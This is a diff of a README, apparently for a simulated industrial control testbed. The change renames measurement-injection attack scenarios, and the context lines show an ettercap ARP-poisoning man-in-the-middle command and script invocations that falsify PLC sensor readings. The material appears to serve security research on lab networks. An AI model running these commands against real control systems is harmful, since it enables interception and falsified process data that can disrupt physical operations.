@@ -69,13 +69,13 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// &
     echo 1 > /proc/sys/net/ipv4/ip_forward
 
-**Attack scenario 6,7,8** (Naive Measurement Injection): Run the following commands for attacks 6, 7, 8 respectively.
+**Attack scenario 6,7,8** (Naive Measurement Modification): Run the following commands for attacks 6, 7, 8 respectively.
 
     python attack_sensor_constant.py PLC2
     python attack_sensor_constant.py PLC3
     python attack_sensor_constant.py BOTH
 
-**Attack scenario 9,10,11 (Calculated Measurement Injection +ve scaling) and Attack scenario 12,13,14 (Calculated Measurement Injection negative scaling)
+**Attack scenario 9,10,11 (Calculated Measurement Modification +ve scaling) and Attack scenario 12,13,14 (Calculated Measurement Injection negative scaling)
 
     python attack_sensor_scaling.py PLC2 +
     python attack_sensor_scaling.py PLC3 +
@@ -84,13 +84,13 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
     python attack_sensor_scaling.py PLC3 -
     python attack_sensor_scaling.py BOTH -
 
-**Attack scenario 15,16,17 (Naive Measurement Injection)
+**Attack scenario 15,16,17 (Naive Measurement Modification)
 
     python attack_sensor_random_withinlimits.py PLC2
     python attack_sensor_random_withinlimits.py PLC3
     python attack_sensor_random_withinlimits.py BOTH
 
-**Attack scenario 18,19,20 (Calculated Measurement Injetcion positive scaling) and Attack scenario 21,22,23 (Calculated Measurement Injection negative scaling)
+**Attack scenario 18,19,20 (Calculated Measurement Modification positive scaling) and Attack scenario 21,22,23 (Calculated Measurement Modification negative scaling)
 
     python attack_sensor_randomp.py PLC2
     python attack_sensor_randomp.py PLC3
